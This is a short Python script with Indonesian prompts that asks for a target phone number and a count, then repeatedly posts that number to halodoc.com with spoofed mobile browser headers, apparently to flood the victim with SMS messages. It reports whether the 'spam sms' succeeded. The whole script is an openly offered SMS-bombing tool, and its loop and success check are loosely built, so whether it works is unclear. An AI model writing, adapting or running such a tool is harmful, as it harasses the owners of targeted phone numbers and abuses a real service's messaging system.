import requests,json,os

os.system("clear")
print("ERROR MULU")
nomor = input("Masukin nomor target > ")
jumlah = int(input("Masukin jumlah spam > "))

headers = {
"Host": "www.halodoc.com",
"upgrade-insecure-requests": "1",
"user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; vivo 1724) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36",
"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
data =json.dumps({"identity":"0"+nomor})
for i in range(jumlah):

  pos = requests.post("https://www.halodoc.com",headers=headers,data=data).text
if "success" in pos:
  print("Spam sms berhasil",)
else:
  print("Spam sms gagal",)
